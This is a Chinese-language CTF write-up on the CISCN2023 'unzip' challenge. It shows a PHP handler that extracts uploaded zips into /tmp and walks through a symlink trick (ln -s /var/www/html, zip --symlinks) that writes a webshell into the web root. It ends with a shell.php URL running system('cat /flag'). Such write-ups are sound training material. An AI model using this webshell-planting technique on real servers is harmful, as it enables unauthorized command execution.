## Unzip

###### Linux软链接

```php
<?php
error_reporting(0);
highlight_file(__FILE__);

$finfo = finfo_open(FILEINFO_MIME_TYPE);
if (finfo_file($finfo, $_FILES["file"]["tmp_name"]) === 'application/zip'){
    //这里是验证MIME值，确定上传的文件类型为zip，同时也为我们指明了方向，要上传一个zip压缩包。
    exec('cd /tmp && unzip -o ' . $_FILES["file"]["tmp_name"]);
    //这里的意思是进入/tmp目录下，然后调用unzip命令对压缩包进行解压，也就是把压缩包解压到/tmp目录下。
};

//only this!
```

有一篇博客写得很清晰：[【CISCN2023】unzip 详解 - gxngxngxn - 博客园 (cnblogs.com)](https://www.cnblogs.com/gxngxngxn/p/17439035.html)

首先什么是软链接：**软链接就是可以将某个目录连接到另一个目录或者文件下，那么我们以后对这个目录的任何操作，都会作用到另一个目录或者文件下。**

那么方向就很明显了，我们可以先上传一个带有软连接的压缩包，这个软连接指向网站的根目录，即/var/www/html,然后我们再上传一个带有马的文件的压缩包，就可以将这个带马文件压缩到网站的根目录下，我们也可以直接访问这个带马文件了，思路瞬间清晰捏，那么直接开始实践:

首先单独创造一个文件夹，然后利用下述命令创建软连接的压缩包:

![img](https://img2023.cnblogs.com/blog/3181170/202305/3181170-20230528223957513-1926723708.png)



```
关键命令:

ln -s /var/www/html link

zip --symlinks link.zip link
```

然后删除link（防止与文件夹重名）这个文件，创建一个名为link的文件夹，然后在这个文件夹下写入带马的Php文件(因为之前我们软连接的文件叫做link，所以我们要让这个压缩在这个文件夹下面):
[![img](https://img2023.cnblogs.com/blog/3181170/202305/3181170-20230528224221795-1571928764.png)](https://img2023.cnblogs.com/blog/3181170/202305/3181170-20230528224221795-1571928764.png)

然后先返回上一级目录,将这个带马的文件进行压缩：

[![img](https://img2023.cnblogs.com/blog/3181170/202305/3181170-20230528224049702-439513493.png)](https://img2023.cnblogs.com/blog/3181170/202305/3181170-20230528224049702-439513493.png)

那么现在完事具备了，只欠上传捏~

[![img](https://img2023.cnblogs.com/blog/3181170/202305/3181170-20230528224100944-371121154.png)](https://img2023.cnblogs.com/blog/3181170/202305/3181170-20230528224100944-371121154.png)

先上传link.zip,然后再上传link1.zip~~~

[![img](https://img2023.cnblogs.com/blog/3181170/202305/3181170-20230528224113908-1058361334.png)](https://img2023.cnblogs.com/blog/3181170/202305/3181170-20230528224113908-1058361334.png)

全部上传完以后，我们就可以访问shell.php,进行命令执行了~~:

[![img](https://img2023.cnblogs.com/blog/3181170/202305/3181170-20230528224126962-1053101306.png)](https://img2023.cnblogs.com/blog/3181170/202305/3181170-20230528224126962-1053101306.png)

至此，这道题算是解决了，好捏~

我的记录：

![image-20231221155741704](C:\Users\92579\AppData\Roaming\Typora\typora-user-images\image-20231221155741704.png)

```
http://e57045fe-b921-4859-906f-1b9ce189b58e.challenge.ctf.show/shell.php?123=system(%27cat%20/flag%27);
```

![image-20231221155636673](C:\Users\92579\AppData\Roaming\Typora\typora-user-images\image-20231221155636673.png)

